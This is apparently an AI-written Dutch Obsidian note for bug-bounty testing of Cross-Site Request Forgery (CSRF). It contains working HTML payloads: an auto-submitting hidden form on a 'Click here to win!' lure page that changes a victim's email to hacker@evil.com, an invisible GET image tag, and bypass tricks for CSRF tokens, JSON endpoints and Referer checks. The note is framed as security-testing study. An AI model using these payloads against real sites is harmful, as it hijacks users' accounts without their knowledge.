
Dit is een lastige maar belangrijke categorie. Bij CSRF dwing je de browser van het slachtoffer om een actie uit te voeren (zoals: _verander wachtwoord_ of _maak geld over_) zonder dat ze het weten.

In tegenstelling tot andere bugs, gebruik je hier **bijna geen terminal commandos**, maar vooral HTML-bestanden en Burp Suite.

Hier is de Obsidian notitie:

Markdown

````
# 🦹 Cross-Site Request Forgery (CSRF)

==Concept: De aanvaller laat het slachtoffer op een link klikken, en op de achtergrond wordt zijn wachtwoord of e-mailadres gewijzigd.==



[Image of CSRF attack diagram]


---

## 🕵️‍♂️ 1. Waar moet je zoeken? (Detection)

Zoek naar functionaliteiten die **data veranderen** (State-Changing Actions):
* Wachtwoord wijzigen
* E-mailadres aanpassen
* Gebruiker toevoegen/verwijderen
* Geld overmaken

**Checklist voor kwetsbaarheid:**
1.  [ ] Is er **geen** onvoorspelbaar token (bv. `csrf_token`) aanwezig in het request?
2.  [ ] Zijn de cookies **niet** ingesteld op `SameSite=Strict` of `Lax`?
3.  [ ] Werkt het request puur op basis van cookies (geen Authorization header)?

---

## 📝 2. HTML Proof of Concept (Manual Exploit)
*Omdat CSRF in de browser gebeurt, is je "exploit" een HTML-bestand. Sla dit op als `exploit.html` en open het in je browser terwijl je ingelogd bent op het target.*

### Standaard POST Formulier (Auto-Submit)
Dit script stuurt onzichtbaar een formulier naar het target zodra het slachtoffer de pagina opent.

```html
<html>
  <body>
    <h1>Click here to win!</h1>
    <form action="[https://target.com/account/change-email](https://target.com/account/change-email)" method="POST">
      <input type="hidden" name="email" value="hacker@evil.com" />
      <input type="hidden" name="confirm" value="true" />
      <input type="submit" value="Click Me" />
    </form>
    <script>
      // Dit zorgt voor automatische verzending zonder klik
      document.forms[0].submit();
    </script>
  </body>
</html>
````

### GET Request (Image Tag)

Als de actie via een simpele URL (GET request) kan, is een plaatje genoeg.

Bijvoorbeeld: https://bank.com/transfer?amount=1000&to=hacker

HTML

```
<img src="[https://target.com/action?param=value](https://target.com/action?param=value)" width="0" height="0" border="0">
```

---

## 🟧 3. Burp Suite (PoC Generator)

_Burp Suite Pro heeft een ingebouwde tool die de HTML voor je schrijft._

1. Vang het request dat je wilt testen (bijv. "Change Email").
    
2. Klik rechts in het request venster.
    
3. Ga naar **Engagement tools** -> **Generate CSRF PoC**.
    
4. Klik op **Copy HTML** en sla het op, of klik op **Test in browser** om de URL naar het slachtoffer te sturen.
    

---

## 🔓 4. Bypasses (Verdediging Omzeilen)

_Als er wel een CSRF-beveiliging lijkt te zijn, probeer deze trucs in Burp Repeater._

### A. Token Verwijderen

Soms checkt de server het token alleen _als het aanwezig is_.

- **Test:** Verwijder de parameter `csrf_token` en de waarde volledig uit de body.
    

### B. HTTP Method Change

Soms is alleen `POST` beveiligd, maar `GET` niet.

- **Test:** Klik rechts in Burp -> **Change request method**.
    
- `POST /api/email` wordt `GET /api/email?new=hacker@test.com`
    

### C. Content-Type Spoofing (JSON CSRF)

Veel API's gebruiken JSON (`{"email": "..."}`), wat lastig is met simpele HTML forms. Maar soms accepteert de server ook andere formats.

Stap 1: Verander Content-Type header in Burp

Van: Content-Type: application/json

Naar: Content-Type: text/plain of application/x-www-form-urlencoded

Stap 2: HTML Payload voor JSON (Text/Plain trick)

Als de server text/plain accepteert, kun je dit formulier gebruiken om JSON te sturen:

HTML

```
<form action="[https://target.com/api/user](https://target.com/api/user)" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"hacker@evil.com", "ignore_me":"' value='test"}' />
  <input type="submit" />
</form>
```

_(Dit stuurt: `{"email":"hacker@evil.com", "ignore_me":"=test"}`. Als de backend dit parset, heb je gewonnen)._

### D. Referer Header Bypass

Soms checkt de site: "Komt dit verzoek wel van `target.com`?".

- **Test 1 (Leeglaten):** Verwijder de `Referer` header in Burp.
    
- **Test 2 (Meta Tag in HTML):** Voeg dit toe aan je exploit file om de referer te verbergen:
    
    HTML
    
    ```
    <meta name="referrer" content="no-referrer">
    ```
    

---

## 🛡️ 5. SameSite Cookies Check

_Moderne browsers blokkeren CSRF standaard via de `SameSite` cookie flag. Je moet checken of dit aan staat._

**In Chrome/Firefox DevTools (F12) -> Application -> Cookies:**

|**SameSite Waarde**|**Betekenis**|**Kwetsbaar?**|
|---|---|---|
|**Strict**|Cookie wordt NOOIT gestuurd via andere site.|🔴 Nee (Veilig)|
|**Lax**|Cookie wordt gestuurd bij "Top Level Navigation" (Links klikken), maar niet bij scripts/images.|🟠 Soms (Alleen GET requests)|
|**None**|Cookie wordt altijd meegestuurd.|🟢 **JA (Kwetsbaar)**|

> [!BUG] Finding
> 
> Als je ziet SameSite=None én er is geen CSRF-token -> Rapporteren!

---

## 🤖 6. Tools (Scanning)

_Automatisch scannen is lastig, maar deze tools helpen._

XSRFProbe

Een scanner specifiek voor CSRF.

Bash

```
xsrfprobe -u [https://target.com](https://target.com)
```
